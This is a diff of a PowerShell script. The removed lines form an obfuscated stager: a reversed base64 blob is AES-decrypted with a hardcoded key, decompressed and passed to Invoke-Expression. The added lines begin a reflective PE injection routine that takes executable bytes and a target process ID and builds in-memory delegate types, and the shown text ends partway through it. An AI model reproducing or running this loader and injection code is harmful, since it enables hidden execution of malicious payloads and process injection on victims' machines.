@@ -1,42 +1,1193 @@
-$oukmpjrhns = "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"
-$zymthrmrnpn = $oukmpjrhns.ToCharArray()
-[array]::Reverse($zymthrmrnpn)
-$rjgzymssnuhzwruyj = -join($zymthrmrnpn)
-$orhgpniwnpzjz = [System.Convert]::FromBase64String("$rjgzymssnuhzwruyj")
-$inhitssvzspkx = [System.Convert]::FromBase64String("j8JFUfS7G6/SS/OptR6NVis32ay4hOWe8mAheus8CtE=")
-$wqvyxiqgxuqwv = "U3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5BZXNNYW5hZ2VkCg=="
-$nmgnhyupqiyhmtuox = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($wqvyxiqgxuqwv))
-$vroqmxuxmrpoq = New-Object "$nmgnhyupqiyhmtuox"
-$ntztgjtzyqrkrms = "==gQDVkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
-$zwwjvsosqhjpokm = $ntztgjtzyqrkrms.ToCharArray()
-[array]::Reverse($zwwjvsosqhjpokm)
-$qkjvrrtrqhotmpq = -join($zwwjvsosqhjpokm)
-$vtxtwugsux = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($qkjvrrtrqhotmpq))
-$tjwujnzgosu = & ([scriptblock]::Create($vtxtwugsux))
-$vroqmxuxmrpoq.Mode = $tjwujnzgosu
-$pvjiwnysvnmw = "==wcvJXZapjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
-$pouwwrwytgg = $pvjiwnysvnmw.ToCharArray()
-[array]::Reverse($pouwwrwytgg)
-$pntvjuuttspz = -join($pouwwrwytgg)
-$ssixqisswyvmq = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pntvjuuttspz))
-$gqgpzopkogzspuo = & ([scriptblock]::Create($ssixqisswyvmq))
-$vroqmxuxmrpoq.Padding = $gqgpzopkogzspuo
-$vroqmxuxmrpoq.BlockSize = 128
-$vroqmxuxmrpoq.KeySize = 128
-$vroqmxuxmrpoq.Key = $inhitssvzspkx
-$vroqmxuxmrpoq.IV = $orhgpniwnpzjz[0..15]
-$kpxoxntzxmg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))
-$ypmtxvmuqiizwt = New-Object $kpxoxntzxmg(,$vroqmxuxmrpoq.CreateDecryptor().TransformFinalBlock($orhgpniwnpzjz,16,$orhgpniwnpzjz.Length-16))
-$oropggjwozotxj = New-Object $kpxoxntzxmg
-$jzssrutggzy = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0="))
-$wjwvvxyzwzxuwhy = New-Object $jzssrutggzy $ypmtxvmuqiizwt, ([IO.Compression.CompressionMode]::Decompress)
-$wjwvvxyzwzxuwhy.CopyTo($oropggjwozotxj)
-$wjwvvxyzwzxuwhy.Close()
-$vroqmxuxmrpoq.Dispose()
-$ypmtxvmuqiizwt.Close()
-$quuyzjhgowqrrp = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))
-$nmswjqzxvutug = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))
-$kpxoxntzxmg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))
-$jzssrutggzy = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))
-$qvgkzopywx = $quuyzjhgowqrrp::$nmswjqzxvutug.$jzssrutggzy($oropggjwozotxj.$kpxoxntzxmg())
-Invoke-Expression($qvgkzopywx)
+
+$RemoteScriptBlock = {
+	[CmdletBinding()]
+	Param(
+		[Parameter(Position = 0, Mandatory = $true)]
+		[Byte[]]
+		$PEBytes,
+
+		[Parameter(Position = 1, Mandatory = $true)]
+		[Int32]
+		$HostPID
+	)
+    function Local:Get-DelegateType
+    {
+        Param
+        (
+            [OutputType([Type])]
+            
+            [Parameter( Position = 0)]
+            [Type[]]
+            $Parameters = (New-Object Type[](0)),
+            
+            [Parameter( Position = 1 )]
+            [Type]
+            $ReturnType = [Void]
+        )
+
+        $Domain = [AppDomain]::CurrentDomain
+        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
